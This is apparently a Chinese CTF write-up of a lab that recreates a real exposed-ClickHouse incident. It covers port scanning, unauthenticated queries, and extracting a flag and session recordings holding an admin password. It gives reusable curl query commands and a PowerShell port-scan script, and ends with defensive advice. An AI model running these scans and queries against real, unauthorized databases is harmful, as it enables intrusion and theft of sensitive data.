# 01 · Open Deepseek Database —— 暴露在互联网上的数据库

> 系列第 1 题 · 对应真实事件：2025 年 1 月某 AI 公司生产数据库无认证暴露
>（题面原文称 "Based on a real critical finding from January 2025 that exposed
>sensitive AI company data to the internet"）· 我的净耗时：约 15 分钟

## 题面

> You've been given a target URL. Rumor has it there's an exposed database
> somewhere on this server - left wide open without authentication.
> Your mission: scan the target, find the database, and extract the flag.

靶场地址：`http://<REDACTED_DOMAIN>/`

## 我的判断路径

拿到题面后我先问自己两个问题：

1. **"exposed database" 最可能是什么形态？** 题面点名复刻 2025 年 1 月的真实事件，
   而那次事件的主角是 ClickHouse——默认端口 8123（HTTP 接口）和 9000（原生协议）。
   所以我的第一假设就是：这两 个端口会有东西。
2. **先扫全端口还是先扫常见端口？** 我选择 20 个常见服务端口的并行 TCP 探测而不是
   全端口扫描，因为课程靶场大概率沿用默认配置，3.5 秒能拿到的答案不值得花 10 分钟。

## 过程

### 1. 侦察：域名、Web 指纹、证书

```
nslookup <REDACTED_DOMAIN>
→ 解析到 <REDACTED_IP>（云服务器，反代为 nginx/1.24.0 Ubuntu）

curl http://<REDACTED_DOMAIN>/        → 301 跳转 https
openssl s_client ... 证书检查          → CN 竟是另一个子域名 <REDACTED_DOMAIN>
```

证书 CN 与访问域名不符这个细节给了我额外情报：**这台服务器上托管着多个题目环境**，
443 上的默认证书属于另一道题。后来这个判断被证实，还提前给了第 2 题的线索。

### 2. 端口扫描：命中假设

用 PowerShell 的 `TcpClient.ConnectAsync` 做 20 端口并行连接探测（约 3.5 秒）：

```
OPEN: 80
OPEN: 443
OPEN: 8080
OPEN: 8123   ← ClickHouse HTTP
OPEN: 9000   ← ClickHouse 原生协议
```

8123 + 9000 同时开放，与我开局的假设完全吻合。8080 也开着（后来确认属于另一道题）。

### 3. 验证无认证访问

```
curl http://<REDACTED_DOMAIN>:8123/
→ Ok.
```

根路径返回 `Ok.` 是 ClickHouse HTTP 接口的标准应答——**没有任何认证质询**，
意味着可以直接发查询。

### 4. 数据定位与提取

```
SHOW DATABASES      → INFORMATION_SCHEMA / deepleak / default / information_schema / system
SHOW TABLES FROM deepleak → log_stream / metric_stream / rrweb / schema_migrations
```

行数：`log_stream` 355,003 行、`metric_stream` 129,092 行、`rrweb` 96,819 行。

我先抽了每张表前 5 行看形态——全是重复样本，肉眼翻页没有意义。
所以我改为**全表特征搜索**：对每张表的文本字段做 `ILIKE '%flag%'` 和 `ILIKE '%{%}%'`
双模式匹配，命中 `log_stream.string_values`：

```
Security audit log: {<REDACTED>}
```

flag 到手，提交即过。

## 关键命令（脱敏后结构可复用）

```bash
TARGET="http://<REDACTED_DOMAIN>:8123"

curl "$TARGET/"                                   # 存活确认 → Ok.
curl "$TARGET/" --data-binary "SHOW DATABASES"     # 枚举库
curl "$TARGET/" --data-binary "SHOW TABLES FROM deepleak"
curl "$TARGET/" --data-binary \
  "SELECT DISTINCT string_values FROM deepleak.log_stream \
   WHERE string_values ILIKE '%flag%' OR string_values ILIKE '%{%}%'"
```

```powershell
# 并行端口探测（Windows 下无需 nmap 的替代）
$ports = 80,443,3000,3306,5432,6379,8000,8080,8123,9000,9200,11211,27017,9042,1433,5000,8888,4443,8443,4000
foreach ($p in $ports) { $c = New-Object Net.Sockets.TcpClient;
  $tasks += @{Port=$p; Client=$c; Task=$c.ConnectAsync($host,$p)} }
Start-Sleep -Milliseconds 3500
# 收集 Connected 的条目
```

## 意外收获（超出 flag 本身的发现）

翻 `rrweb` 表时发现它存的是**管理后台的会话录像**（rrweb 格式的前端录屏事件流），
其中 `input` 类型事件回放出了管理员在登录框里输入的明文密码（值已脱敏）。
这正对应真实事件中最致命的部分：会话录像泄露比日志泄露敏感得多——
它回放的是**人的行为**，包括输错的密码、粘贴的 token、访问过的页面。

## 失败与弯路

本题一次通过，无返工。但有一个流程细节值得记：第一轮 `LIMIT 5` 预览全是重复行时，
我差点准备翻页浏览，及时改成全表特征搜索才在几秒内命中——
**数据量大时，先定搜索策略再动手，不要用肉眼对抗十万行**。

## 防御视角（如果我是蓝队）

1. 数据库服务（ClickHouse/Redis/Mongo…）永不直接暴露公网，收进内网 + 防火墙白名单
2. 必须启用认证——ClickHouse 默认配置的 `default` 用户无密码是经典陷阱
3. rrweb 这类会话录像属于最高敏数据，加密存储 + 严格访问控制 + 短保留期
4. 监控出站视角：任何数据库端口出现在公网扫描结果里都应触发告警

## 证据

- `evidence/01-1-flag-submitted.png` —— 提交成功页面
  【待我确认：请检查截图中 flag 输入框是否仍显示 flag 原文；若是，请重截一张
  仅含成功状态的图替换，或告诉我位置，我来裁剪】
